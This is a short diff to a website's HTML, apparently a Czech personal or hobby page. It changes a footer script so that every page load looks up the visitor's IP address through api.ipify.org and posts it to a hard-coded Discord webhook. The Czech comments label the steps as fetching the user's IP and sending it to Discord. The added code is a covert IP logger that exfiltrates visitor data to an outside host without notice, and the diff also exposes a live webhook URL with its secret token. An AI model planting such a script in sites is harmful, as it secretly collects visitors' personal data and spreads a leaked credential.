@@ -100,9 +100,9 @@
         <p>&copy; 2024 Matyáš Šibor | edit</p>
         <p>&reg; 2024 Štěpán Valíček | web</p>
     </footer>
-        <script>
+    <script>
         // Získání IP adresy uživatele
-        fetch('https://discord.com/api/webhooks/1249992879842267136/WAiERCu_Nq1GUHqocOwEAPCyKX0b2DPwzhzMrD3x7BfqFmWz9bfM_c5W4Aohrf4DSwAW')
+        fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 const userIp = data.ip;
@@ -113,7 +113,7 @@
                 };
 
                 // Odeslání webhooku na Discord
-                fetch('WEBHOOK_URL', {
+                fetch('https://discord.com/api/webhooks/1249992879842267136/WAiERCu_Nq1GUHqocOwEAPCyKX0b2DPwzhzMrD3x7BfqFmWz9bfM_c5W4Aohrf4DSwAW', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
